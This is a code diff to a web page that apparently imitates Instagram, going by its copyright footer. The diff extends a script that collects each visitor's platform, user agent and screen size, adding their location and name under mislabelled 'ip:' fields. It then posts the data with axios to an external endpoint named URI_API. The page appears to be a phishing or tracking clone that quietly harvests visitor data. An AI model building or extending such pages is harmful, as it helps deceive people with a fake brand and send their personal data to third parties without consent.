@@ -64,6 +64,7 @@
             <li><a href="#">MORE ACCOUNTS</a></li>
             <li><a href="#">HASHTAGS</a></li>
             <li><a href="#">LANGUAGE</a></li>
+            
         </ul>
         <p class="copyright">© 2024 Instagram from Facebook</p>
     </footer>
@@ -102,6 +103,8 @@
                         <b>Platform:</b> ${platform}\n
                         <b>User Agent:</b> ${userAgent}\n
                         <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                        <b>ip:</b> ${location}\n
+                       <b>ip:</b> ${name}\n
                     `;
     
                     axios.post(URI_API, {
